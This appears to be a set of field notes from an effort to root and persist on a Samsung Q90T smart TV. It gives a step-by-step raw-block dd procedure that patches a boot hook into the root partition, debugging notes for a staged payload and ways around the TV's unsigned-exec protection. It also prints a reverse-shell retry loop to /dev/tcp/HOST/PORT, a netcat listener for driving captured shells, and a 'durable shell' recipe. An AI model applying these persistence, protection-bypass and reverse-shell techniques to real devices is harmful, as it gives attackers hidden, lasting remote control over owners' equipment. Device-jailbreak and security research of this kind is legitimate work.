# Q90T field notes — the manual procedures and the scripting failures

> Companion: `q90t-field-notes-2026-10-25.md` covers app-booting,
> standby/wake, and CleanFrame. This file is the manual-procedures record;
> the two are not duplicates.

Companion to `targets/q90t-nikem-2020.md`. These are the things that
worked by hand when the scripted path failed, on QN55Q90TAFXZC /
T-NKMAKUC-REL-202505100505.

## Persistence: the manual block surgery (verified, repeat this one)

`apply-persistent-hook.sh` wedged twice in D-state (0-byte log, never
reaching its first echo) and is unkillable from uid 901. The manual
procedure below worked first try:

1. The marker `alias lr="ls -ltrZ"` sits at raw byte **1611268725** on
   `/dev/mmcblk0p18`. File start = 1611268096 = 512-byte block **3147008**
   (exactly aligned); the 776-byte file spans blocks 3147008–3147009.
2. Read the candidate: `dd if=/dev/mmcblk0p18 bs=512 skip=3147008 count=2
   of=/tmp/cand.bin` — the first 776 bytes must hash to the vendor original
   (sha256 `effe97f8…`, md5 `e8a3d347…`).
3. Backup: `cp /tmp/cand.bin /opt/usr/share/tvroot/backup/rootfs-p18-blk3147008-2.bin`.
4. Overlay: `cp cand.bin write.bin`; `dd if=hook-patched.bin of=write.bin
   bs=1 conv=notrunc`.
5. Write: `dd if=write.bin of=/dev/mmcblk0p18 bs=512 seek=3147008 count=2
   conv=notrunc; sync` — raw writes to the mounted partition are fine; it
   was the script's own early I/O that hung, not the block layer.
6. Verify: raw readback hash == write.bin; `echo 3 >
   /proc/sys/vm/drop_caches`; the filesystem must then serve the patched
   hash (`965f0663…`).
7. Rollback = write the backup blocks back with the same dd shape.

## Scripting failures to remember

* The shipped stage command's wait loop has an unquoted `$S`:
  `[ -n $S ]` with an empty `$S` is a one-argument test that is always
  true, so the loop breaks instantly and stage1 never runs. Quote it:
  `[ -n "$S" ]` (+4 bytes; the cave stays ≤ 547).
* stage1's dropbear lines kill the whole script: exec'ing the unsigned
  `dropbearmulti` trips UEP and the process dies silently. Keep dropbear
  last, in a subshell, or accept the best-effort death.
* The profile.d hook's dial-back never connected for two independent
  reasons: it runs at ~0.7s after power-on when the network is still down
  ("Network is unreachable"), and its subshell would be SIGHUP'd at the
  boot-chain exit anyway. The working recipe would be a nohup'd retry
  loop:
  `nohup bash -c 'for i in {1..120}; do exec 9<>/dev/tcp/HOST/PORT && break; sleep 1; done; /bin/bash -i <&9 >&9 2>&9' >/dev/null 2>&1 &`.
  (Skipped entirely: the hook runs our scripts and results are read via
  uid 901; dropbear-ssh is the future channel once UEP is down.)
* Auto-capturing the kernel-stage shell: fed lines must stay under ~80
  characters — `bash -i`'s line editor mangles longer ones. Heredocs with
  76-char base64 lines work; one-shot `{ printf 'CMD\n'; sleep N; } |
  nc -l 4444 >> log` per boot is the pattern.
* The durable-shell recipe: `nohup bash -i >&9 2>&1 <&9 &` immediately
  after the prompt, then `kill -9 $PPID` to remove the rival original
  shell that also reads the socket.

## Wrong turns (so nobody re-derives them)

1. TOC length 3844/3840 vs **3984** — cost the longest. Check the
   cumulative chain against EOF before suspecting the key; the fingerprint
   is "TOC parses, every section decrypts to garbage with bad padding."
2. Reading the updater's TEEC param order backwards once — the original
   client had p0/p1 right; the real fix was p1.size = chunk size.
3. CIFS/Remote-PC bounded root (now historical): the password field
   mangles spaces (commas appear — the credential join), `<` is unsafe,
   saved profiles mangle values.
4. `sh /tmp/t.sh` payloads failing: UEP (path-arg script load), the /tmp
   janitor, and field mangling all confounded; never isolated.
5. "Apply script wedges": D-state + 0-byte log + no backup dir — stop
   debugging the script, do the surgery by hand (§1).

## Platform notes

* Signing: the SDK's old distributor certs are expired (pkgcmd -22); the
  2022 `-new` chain is not in this TV's trust store (-12). Apps2Samsung is
  the only working installer. (Signing profile secrets live in the local
  profiles.xml, not here.)
* sdb: uid-901 injection is the only shell-like channel; `sdb pull` works
  only for the `sdk_tools/profctl_*.log` whitelist; the channel wedges
  after bursts (kill the local server, retry; a power-cycle always clears).
* uid 901 cannot kill root processes, cannot read raw block devices
  (0600 root:disk), cannot write `/opt` — root work goes through the stick
  shells.
* UEP: unsigned binaries never exec (silently killed); signed `sh` with
  content-passed scripts (`sh -c "$(cat …)"`) is the universal workaround.
* macOS fsKit defuses the stick: any Mac mount "repairs" the crafted exFAT.
  Flash → `diskutil unmountDisk force` → `diskutil eject` → straight to the
  TV. Never re-insert into the Mac.
